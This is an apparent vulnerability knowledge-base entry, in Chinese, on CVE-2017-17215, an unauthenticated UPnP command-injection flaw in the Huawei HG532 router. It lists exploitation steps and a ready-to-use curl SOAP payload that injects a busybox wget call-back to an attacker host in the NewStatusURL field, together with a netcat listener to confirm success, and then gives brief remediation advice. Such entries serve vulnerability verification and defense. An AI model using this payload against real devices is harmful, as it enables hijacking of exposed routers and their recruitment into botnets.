Vuln/network/huawei/CVE-2017-17215.md

---
id: CVE-2017-17215
title: 华为 HG532 远程命令执行（CVE-2017-17215）
product: huawei
vendor: Huawei
version_affected: "HG532 all firmware versions"
severity: CRITICAL
tags: [rce, iot, upnp, 无需认证]
fingerprint: ["HG532", "Huawei"]
---

## 漏洞描述

华为 HG532 路由器在 UPnP 服务中存在命令注入漏洞。攻击者可以通过发送恶意的 UPnP SOAP 请求在 `NewStatusURL` 和 `NewDownloadUrlFileName` 字段注入系统命令。该漏洞被 Satori 僵尸网络广泛利用。

## 影响版本

- Huawei HG532 所有固件版本

## 前置条件

- 无需认证
- UPnP 端口可达（默认 37215）

## 利用步骤

1. 确认目标为华为 HG532 路由器
2. 向 UPnP 端口发送恶意 SOAP 请求
3. 在 NewStatusURL 字段注入命令

## Payload

```bash
curl -X POST "http://target:37215/ctrlt/DeviceUpgrade_1" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
      <NewStatusURL>$(/bin/busybox wget http://attacker_ip:8888/callback)</NewStatusURL>
      <NewDownloadURL>$(echo HUAWEI)</NewDownloadURL>
    </u:Upgrade>
  </s:Body>
</s:Envelope>'
```

## 验证方法

```bash
# 在攻击机启动监听
nc -lvp 8888
# 发送上述 payload 后检查是否收到 HTTP 请求
```

## 修复建议

- 更新路由器固件
- 关闭 UPnP 服务
- 不将设备暴露到公网
